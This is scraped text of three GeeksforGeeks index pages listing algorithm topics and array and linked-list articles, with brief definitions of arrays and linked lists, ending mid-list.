Algorithms: Activity Selection Problem Kruskal’s Minimum Spanning Tree Algorithm Huffman Coding Efficient Huffman Coding for Sorted Input Prim’s Minimum Spanning Tree Algorithm Prim’s MST for Adjacency List Representation Dijkstra’s Shortest Path Algorithm Dijkstra’s Algorithm for Adjacency List Representation Job Sequencing Problem Quiz on Greedy Algorithms Greedy Algorithm to find Minimum number of Coins K Centers Problem Minimum Number of Platforms Required for a Railway/Bus Station Recent Articles on Greedy Algorithms Quiz on Greedy Algorithms Coding Practice on Greedy Algorithms Dynamic Programming: Overlapping Subproblems Property Optimal Substructure Property Longest Increasing Subsequence Longest Common Subsequence Edit Distance Min Cost Path Coin Change Matrix Chain Multiplication Binomial Coefficient 0-1 Knapsack Problem Egg Dropping Puzzle Longest Palindromic Subsequence Cutting a Rod Maximum Sum Increasing Subsequence Longest Bitonic Subsequence Floyd Warshall Algorithm Palindrome Partitioning Partition problem Word Wrap Problem Maximum Length Chain of Pairs Variations of LIS Box Stacking Problem Program for Fibonacci numbers Minimum number of jumps to reach end Maximum size square sub-matrix with all 1s Ugly Numbers Largest Sum Contiguous Subarray Longest Palindromic Substring Bellman–Ford Algorithm for Shortest Paths Optimal Binary Search Tree Largest Independent Set Problem Subset Sum Problem Maximum sum rectangle in a 2D matrix Count number of binary strings without consecutive 1?s Boolean Parenthesization Problem Count ways to reach the n’th stair Minimum Cost Polygon Triangulation Mobile Numeric Keypad Problem Count of n digit numbers whose sum of digits equals to given sum Minimum Initial Points to Reach Destination Total number of non-decreasing numbers with n digits Find length of the longest consecutive path from a given starting character Tiling Problem Minimum number of squares whose sum equals to given number n Find minimum number of coins that make a given value Collect maximum points in a grid using two traversals Shortest Common Supersequence Compute sum of digits in all numbers from 1 to n Count possible ways to construct buildings Maximum profit by buying and selling a share at most twice How to print maximum number of A’s using given four keys Find the minimum cost to reach destination using a train Vertex Cover Problem | Set 2 (Dynamic Programming Solution for Tree) Count number of ways to reach a given score in a game Weighted Job Scheduling Longest Even Length Substring such that Sum of First and Second Half is same Recent Articles on Dynamic Programming Quiz on Dynamic Programming Coding Practice on Dynamic Programing Pattern Searching: Naive Pattern Searching KMP Algorithm Rabin-Karp Algorithm A Naive Pattern Searching Question Finite Automata Efficient Construction of Finite Automata Boyer Moore Algorithm – Bad Character Heuristic Suffix Array Anagram Substring Search (Or Search for all permutations) Pattern Searching using a Trie of all Suffixes Aho-Corasick Algorithm for Pattern Searching kasai’s Algorithm for Construction of LCP array from Suffix Array Z algorithm (Linear time pattern searching Algorithm) Program to wish Women’s Day Recent Articles on Pattern Searching Other String Algorithms: Manacher’s Algorithm – Linear Time Longest Palindromic Substring – Part 1, Part 2, Part 3, Part 4 Longest Even Length Substring such that Sum of First and Second Half is same Print all possible strings that can be made by placing spaces Recent Articles on Strings Coding practice on Strings Backtracking: Print all permutations of a given string The Knight’s tour problem Rat in a Maze N Queen Problem Subset Sum m Coloring Problem Hamiltonian Cycle Sudoku Tug of War Solving Cryptarithmetic Puzzles Recent Articles on Backtracking Coding Practice on Backtracking Divide and Conquer: Introduction Write your own pow(x, n) to calculate x*n Median of two sorted arrays Count Inversions Closest Pair of Points Strassen’s Matrix Multiplication Quick Sort vs Merge Sort Recent Articles on Divide and Conquer Quiz on Divide and Conquer Coding practice on Divide and Conquer Geometric Algorithms: Closest Pair of Points | O(nlogn) Implementation How to check if two given line segments intersect? How to check if a given point lies inside or outside a polygon? Convex Hull | Set 1 (Jarvis’s Algorithm or Wrapping) Convex Hull | Set 2 (Graham Scan) Given n line segments, find if any two segments intersect Check whether a given point lies inside a triangle or not How to check if given four points form a square Recent Articles on Geometric Algorithms Coding Practice on Geometric Algorithms Mathematical Algorithms: Write an Efficient Method to Check if a Number is Multiple of 3 Efficient way to multiply with 7 Write a C program to print all permutations of a given string Lucky Numbers Write a program to add two numbers in base 14 Babylonian method for square root Multiply two integers without using multiplication, division and bitwise operators, and no loops Print all combinations of points that can compose a given number Write you own Power without using multiplication(*) and division(/) operators Program for Fibonacci numbers Average of a stream of numbers Count numbers that don’t contain 3 MagicSquare Sieve of Eratosthenes Number which has the maximum number of distinct prime factors in the range M to N Find day of the week for a given date DFA based division Generate integer from 1 to 7 with equal probability Given a number, find the next smallest palindrome Make a fair coin from a biased coin Check divisibility by 7 Find the largest multiple of 3 Lexicographic rank of a string Print all permutations in sorted (lexicographic) order Shuffle a given array Space and time efficient Binomial Coefficient Reservoir Sampling Pascal’s Triangle Select a random number from stream, with O(1) space Find the largest multiple of 2, 3 and 5 Efficient program to calculate e^x Measure one litre using two vessels and infinite water supply Efficient program to print all prime factors of a given number Print all possible combinations of r elements in a given array of size n Random number generator in arbitrary probability distribution fashion How to check if a given number is Fibonacci number? Russian Peasant Multiplication Count all possible groups of size 2 or 3 that have sum as multiple of 3 Tower of Hanoi Horner’s Method for Polynomial Evaluation Count trailing zeroes in factorial of a number Program for nth Catalan Number Generate one of 3 numbers according to given probabilities Find Excel column name from a given column number Find next greater number with same set of digits Count Possible Decodings of a given Digit Sequence Calculate the angle between hour hand and minute hand Count number of binary strings without consecutive 1?s Find the smallest number whose digits multiply to a given number n Draw a circle without floating point arithmetic How to check if an instance of 8 puzzle is solvable? Birthday Paradox Multiply two polynomials Count Distinct Non-Negative Integer Pairs (x, y) that Satisfy the Inequality x*x + y*y < n Count ways to reach the n’th stair Replace all ‘0’ with ‘5’ in an input Integer Program to add two polynomials Print first k digits of 1/n where n is a positive integer Given a number as a string, find the number of contiguous subsequences which recursively add up to 9 Program for Bisection Method Program for Method Of False Position Program for Newton Raphson Method Recent Articles on Mathematical Algorithms Coding Practice on Mathematical Algorithms Bit Algorithms: Find the element that appears once Detect opposite signs Set bits in all numbers from 1 to n Swap bits Add two numbers Smallest of three A Boolean Array Puzzle Set bits in an (big) array Next higher number with same number of set bits Optimization Technique (Modulus) Add 1 to a number Multiply with 3.5 Turn off the rightmost set bit Check for Power of 4 Absolute value (abs) without branching Modulus division by a power-of-2-number Minimum or Maximum of two integers Rotate bits Find the two non-repeating elements in an array Number Occurring Odd Number of Times Check for Integer Overflow Little and Big Endian Reverse Bits of a Number Count set bits in an integer Number of bits to be flipped to convert A to B Next Power of 2 Check if a Number is Multiple of 3 Find parity Multiply with 7 Find whether a no is power of two Position of rightmost set bit Binary representation of a given number Swap all odd and even bits Find position of the only set bit Karatsuba algorithm for fast multiplication How to swap two numbers without using a temporary variable? Check if a number is multiple of 9 using bitwise operators Swap two nibbles in a byte How to turn off a particular bit in a number? Check if binary representation of a number is palindrome Recent Articles on Bit Algorithms Quiz on Bit Algorithms Coding Practice on Bit Algorithms Graph Algorithms: Introduction, DFS and BFS: Graph and its representations Breadth First Traversal for a Graph Depth First Traversal for a Graph Applications of Depth First Search Detect Cycle in a Directed Graph Detect Cycle in a an Undirected Graph Detect cycle in an undirected graph Longest Path in a Directed Acyclic Graph Topological Sorting Check whether a given graph is Bipartite or not Snake and Ladder Problem Biconnected Components Check if a given graph is tree or not Minimum Spanning Tree: Prim’s Minimum Spanning Tree (MST)) Applications of Minimum Spanning Tree Problem Prim’s MST for Adjacency List Representation Kruskal’s Minimum Spanning Tree Algorithm Boruvka’s algorithm for Minimum Spanning Tree Shortest Paths: Dijkstra’s shortest path algorithm Dijkstra’s Algorithm for Adjacency List Representation Bellman–Ford Algorithm Floyd Warshall Algorithm Johnson’s algorithm for All-pairs shortest paths Shortest Path in Directed Acyclic Graph Some interesting shortest path questions Shortest path with exactly k edges in a directed and weighted graph Connectivity: Find if there is a path between two vertices in a directed graph Connectivity in a directed graph Articulation Points (or Cut Vertices) in a Graph Biconnected graph Bridges in a graph Eulerian path and circuit Fleury’s Algorithm for printing Eulerian Path or Circuit Strongly Connected Components Transitive closure of a graph Find the number of islands Count all possible walks from a source to a destination with exactly k edges Euler Circuit in a Directed Graph Biconnected Components Tarjan’s Algorithm to find Strongly Connected Components Hard Problems: Graph Coloring (Introduction and Applications) Greedy Algorithm for Graph Coloring Travelling Salesman Problem (Naive and Dynamic Programming) Travelling Salesman Problem (Approximate using MST) Hamiltonian Cycle Vertex Cover Problem (Introduction and Approximate Algorithm) K Centers Problem (Greedy Approximate Algorithm) Maximum Flow: Ford-Fulkerson Algorithm for Maximum Flow Problem Find maximum number of edge disjoint paths between two vertices Find minimum s-t cut in a flow network Maximum Bipartite Matching Channel Assignment Problem Misc: Find if the strings can be chained to form a circle Given a sorted dictionary of an alien language, find order of characters Karger’s algorithm for Minimum Cut Karger’s algorithm for Minimum Cut | Set 2 (Analysis and Applications) Hopcroft–Karp Algorithm for Maximum Matching | Set 1 (Introduction) Hopcroft–Karp Algorithm for Maximum Matching | Set 2 (Implementation) Length of shortest chain to reach a target word Find same contacts in a list of contacts All Algorithms on Graph Quiz on Graph Quiz on Graph Traversals Quiz on Graph Shortest Paths Quiz on Graph Minimum Spanning Tree Coding Practice on Graph Randomized Algorithms: Linearity of Expectation Expected Number of Trials until Success Randomized Algorithms | Set 0 (Mathematical Background) Randomized Algorithms | Set 1 (Introduction and Analysis) Randomized Algorithms | Set 2 (Classification and Applications) Randomized Algorithms | Set 3 (1/2 Approximate Median) Karger’s algorithm for Minimum Cut K’th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time) Reservoir Sampling Shuffle a given array Select a Random Node from a Singly Linked List Recent Articles on Randomized Algorithms Branch and Bound: Branch and Bound | Set 1 (Introduction with 0/1 Knapsack) Branch and Bound | Set 2 (Implementation of 0/1 Knapsack) Branch and Bound | Set 3 (8 puzzle Problem) Branch And Bound | Set 4 (Job Assignment Problem) Branch and Bound | Set 5 (N Queen Problem) Branch And Bound | Set 6 (Traveling Salesman Problem) Recent Articles on Branch and Bound Quizzes on Algorithms: Analysis of Algorithms Sorting Divide and Conquer Greedy Algorithms Dynamic Programming Backtracking Misc NP Complete Searching Analysis of Algorithms (Recurrences) Recursion Bit Algorithms Graph Traversals Graph Shortest Paths Graph Minimum Spanning Tree Misc: Commonly Asked Algorithm Interview Questions | Set 1 Given a matrix of ‘O’ and ‘X’, find the largest subsquare surrounded by ‘X’ Nuts & Bolts Problem (Lock & Key problem) Flood fill Algorithm – how to implement fill() in paint? Given n appointments, find all conflicting appointments Check a given sentence for a given set of simple grammer rules Find Index of 0 to be replaced with 1 to get longest continuous sequence of 1s in a binary array How to check if two given sets are disjoint? Minimum Number of Platforms Required for a Railway/Bus Station Length of the largest subarray with contiguous elements | Set 1 Length of the largest subarray with contiguous elements | Set 2 Print all increasing sequences of length k from first n natural numbers Given two strings, find if first string is a subsequence of second Snake and Ladder Problem Write a function that returns 2 for input 1 and returns 1 for 2 Connect n ropes with minimum cost Find the number of valid parentheses expressions of given length Longest Monotonically Increasing Subsequence Size (N log N): Simple implementation Generate all binary permutations such that there are more 1’s than 0’s at every point in all permutations Lexicographically minimum string rotation Construct an array from its pair-sum array Program to evaluate simple expressions Check if characters of a given string can be rearranged to form a palindrome Print all pairs of anagrams in a given array of strings Please see Data Structures and Advanced Data Structures for Graph, Binary Tree, BST and Linked List based algorithms. We will be adding more categories and posts to this page soon. You can create a new Algorithm topic and discuss it with other geeks using our portal PRACTICE. See recently added problems on Algorithms on PRACTICE. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Array Data Structure - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Array Data Structure Recent articles on Arrays An array is a collection of items stored at contiguous memory locations. The idea is to store multiple items of the same type together. This makes it easier to calculate the position of each element by simply adding an offset to a base value, i.e., the memory location of the first element of the array (generally denoted by the name of the array). The above image can be looked as a top-level view of a staircase where you are at the base of the staircase. Each element can be uniquely identified by their index in the array (in a similar way as you could identify your friends by the step on which they were on in the above example). Topics : Introduction Array Rotations Arrangement Rearrangement Order Statistics Range Queries Searching and Sorting Optimization Problems Matrix Misc Quick Links Array Introduction : Introduction to Arrays Arrays in C/C++ Arrays in Java Arrays in Python Arrays in C# Array Rotations : Program for array rotation Reversal algorithm for array rotation Block swap algorithm for array rotation Program to cyclically rotate an array by one Search an element in a sorted and rotated array Given a sorted and rotated array, find if there is a pair with a given sum Find maximum value of Sum( i*arr[i]) with only rotations on given array allowed Maximum sum of i*arr[i] among all rotations of a given array Find the Rotation Count in Rotated Sorted array Quickly find multiple left rotations of an array Find the minimum element in a sorted and rotated array Reversal algorithm for right rotation of an array Find a rotation with maximum hamming distance Queries on Left and Right Circular shift on array Print left rotation of array in O(n) time and O(1) space Find element at given index after a number of rotations Split the array and add the first part to the end More >> Arrangement Rearrangement : Rearrange an array such that arr[i] = i Write a program to reverse an array or string Rearrange array such that arr[i] >= arr[j] if i is even and arr[i]<=arr[j] if i is odd and j < i Rearrange positive and negative numbers in O(n) time and O(1) extra space Rearrange array in alternating positive & negative items with O(1) extra space | Set 1 Move all zeroes to end of array Move all zeroes to end of array | Set-2 (Using single traversal) Minimum swaps required to bring all elements less than or equal to k together Rearrange positive and negative numbers using inbuilt sort function Rearrange array such that even positioned are greater than odd Rearrange an array in order – smallest, largest, 2nd smallest, 2nd largest, .. Double the first element and move zero to end Reorder an array according to given indexes Rearrange positive and negative numbers with constant extra space Arrange given numbers to form the biggest number Rearrange an array such that ‘arr[j]’ becomes ‘i’ if ‘arr[i]’ is ‘j’ Rearrange an array in maximum minimum form | Set 1 Rearrange an array in maximum minimum form | Set 2 (O(1) extra space) Move all negative numbers to beginning and positive to end with constant extra space Move all negative elements to end in order with extra space allowed Rearrange array such that even index elements are smaller and odd index elements are greater Positive elements at even and negative at odd positions Replace every array element by multiplication of previous and next Shuffle a given array Segregate even and odd numbers More >> Order Statistics : K’th Smallest/Largest Element in Unsorted Array | Set 1 K’th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time) K’th Smallest/Largest Element in Unsorted Array | Set 3 (Worst Case Linear Time) K’th Smallest/Largest Element using STL k largest(or smallest) elements in an array | added Min Heap method Kth smallest element in a row-wise and column-wise sorted 2D array | Set 1 Program to find largest element in an array Find the largest three elements in an array Find all elements in array which have at-least two greater elements Program for Mean and median of an unsorted array Median of Stream of Running Integers using STL Minimum product of k integers in an array of positive Integers K-th Largest Sum Contiguous Subarray K maximum sum combinations from two arrays K maximum sums of overlapping contiguous sub-arrays K maximum sums of non-overlapping contiguous sub-arrays k smallest elements in same order using O(1) extra space Find k pairs with smallest sums in two arrays k-th smallest absolute difference of two elements in an array Find Second largest element in an array Find k numbers with most occurrences in the given array Find the smallest and second smallest elements in an array Find the smallest missing number Maximum sum such that no two elements are adjacent Maximum and minimum of an array using minimum number of comparisons More >> Range Queries : MO’s Algorithm Sqrt (or Square Root) Decomposition Technique | Set 1 (Introduction) Sparse Table Range sum query using Sparse Table Range Minimum Query (Square Root Decomposition and Sparse Table) Range Queries for Frequencies of array elements Constant time range add operation on an array Range LCM Queries GCDs of given index ranges in an array Queries for GCD of all numbers of an array except elements in a given range Number of elements less than or equal to a given number in a given subarray Number of elements less than or equal to a given number in a given subarray | Set 2 (Including Updates) Queries for counts of array elements with values in given range Queries for decimal values of subarrays of a binary array Count elements which divide all numbers in range L-R Number whose sum of XOR with given array range is maximum XOR of numbers that appeared even number of times in given Range Array range queries over range queries Array range queries for searching an element Array range queries for elements with frequency same as value Maximum Occurrence in a Given Range Number of indexes with equal elements in given range Merge Sort Tree for Range Order Statistics Total numbers with no repeated digits in a range Difference Array | Range update query in O(1) More >> Optimization Problems : Largest Sum Contiguous Subarray Maximum profit by buying and selling a share at most twice Find the subarray with least average Find the minimum distance between two numbers Minimize the maximum difference between the heights Minimum number of jumps to reach end Dynamic Programming | Set 14 (Maximum Sum Increasing Subsequence) Smallest subarray with sum greater than a given value Find maximum average subarray of k length Count minimum steps to get the given desired array Number of subsets with product less than k Find minimum number of merge operations to make an array palindrome Find the smallest positive integer value that cannot be represented as sum of any subset of a given array Size of The Subarray With Maximum Sum Find minimum difference between any two elements Space optimization using bit manipulations Longest Span with same Sum in two Binary arrays Sorting : Alternative Sorting Sort a nearly sorted (or K sorted) array Sort an array according to absolute difference with given value Sort an array in wave form Merge an array of size n into another array of size m+n Sort an array which contain 1 to n values Sort 1 to N by swapping adjacent elements Sort an array containing two types of elements Sort elements by frequency | Set 1 Count Inversions in an array | Set 1 (Using Merge Sort) Two elements whose sum is closest to zero Shortest Un-ordered Subarray Minimum number of swaps required to sort an array Union and Intersection of two sorted arrays Find Union and Intersection of two unsorted arrays Sort an array of 0s, 1s and 2s Find the Minimum length Unsorted Subarray, sorting which makes the complete array sorted Median in a stream of integers (running integers) Count the number of possible triangles Find number of pairs (x, y) in an array such that x^y > y^x Count all distinct pairs with difference equal to k Print All Distinct Elements of a given integer array Construct an array from its pair-sum array Merge two sorted arrays with O(1) extra space Product of maximum in first array and minimum in second More >> Searching : Search, insert and delete in an unsorted array Search, insert and delete in a sorted array Given an array A[] and a number x, check for pair in A[] with sum as x Searching in an array where adjacent differ by at most k Find common elements in three sorted arrays Find position of an element in a sorted array of infinite numbers Find the only repetitive element between 1 to n-1 Find the element that appears once Maximum Subarray Sum Excluding Certain Elements Maximum equlibrium sum in an array Equilibrium index of an array Leaders in an array Ceiling in a sorted array Majority Element Check for Majority Element in a sorted array Check if an array has a majority element Two Pointers Technique Find a peak element Find the two repeating elements in a given array Find a Fixed Point in a given array Find sub-array with given sum Maximum triplet sum in array Smallest Difference Triplet from Three arrays Find a triplet that sum to a given value Find all triplets with zero sum More >> Matrix : Rotate Matrix Elements Inplace rotate square matrix by 90 degrees | Set 1 Rotate a matrix by 90 degree without using any extra space | Set 2 Rotate a Matrix by 180 degree Turn an image by 90 degree Rotate each ring of matrix anticlockwise by K elements Check if all rows of a matrix are circular rotations of each other Sort the given matrix Find the row with maximum number of 1s Find median in row wise sorted matrix Matrix Multiplication | Recursive Program to multiply two matrices Program for scalar multiplication of a matrix Program to print Lower triangular and Upper triangular matrix of an array Find distinct elements common to all rows of a matrix Print a given matrix in spiral form Find maximum element of each row in a matrix Find unique elements in a matrix Shift matrix elements row-wise by k Different Operations on Matrices Print a given matrix in counter-clock wise spiral form Swap major and minor diagonals of a square matrix Maximum path sum in matrix Squares of Matrix Diagonal Elements Move matrix elements in given direction and add elements with same value More >> Misc : Subarray/Substring vs Subsequence and Programs to Generate them A Product Array Puzzle Number of subarrays with given product Linked List vs Array Check if array elements are consecutive | Added Method 3 Find whether an array is subset of another array | Added Method 3 Implement two stacks in an array Find relative complement of two sorted arrays Minimum increment by k operations to make all elements equal Minimize (max(A[i], B[j], C[k]) – min(A[i], B[j], C[k])) of three different sorted arrays Quick Links : ‘Practice Problems’ on Arrays ‘Quizzes’ on Arrays ‘Video Tutorials’ on Arrays If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Linked List Data Structure - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Linked List Data Structure Recent Articles on Linked List A linked list is a linear data structure, in which the elements are not stored at contiguous memory locations. The elements in a linked list are linked using pointers as shown in the below image: In simple words, a linked list consists of nodes where each node contains a data field and a reference(link) to the next node in the list. Topics : Singly Linked List Circular Linked List Doubly Linked List Misc Quick Links Singly Linked List : Introduction to Linked List Linked List vs Array Linked List Insertion Linked List Deletion (Deleting a given key) Linked List Deletion (Deleting a key at given position) Write a function to delete a Linked List Find Length of a Linked List (Iterative and Recursive) Search an element in a Linked List (Iterative and Recursive) Write a function to get Nth node in a Linked List Nth node from the end of a Linked List Print the middle of a given linked list Write a function that counts the number of times a given int occurs in a Linked List Detect loop in a linked list Find length of loop in linked list Function to check if a singly linked list is palindrome Remove duplicates from a sorted linked list Remove duplicates from an unsorted linked list Swap nodes in a linked list without swapping data Pairwise swap elements of a given linked list Move last 